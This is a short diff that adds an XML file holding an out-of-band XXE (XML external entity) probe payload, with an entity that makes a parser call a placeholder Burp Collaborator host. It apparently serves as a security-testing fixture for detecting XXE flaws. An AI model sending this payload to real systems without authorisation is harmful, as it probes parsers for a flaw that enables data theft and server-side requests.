@@ -1,0 +1,4 @@
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "http://your-burp-collaborator.com/test">
+]>
+<data>&xxe;</data>
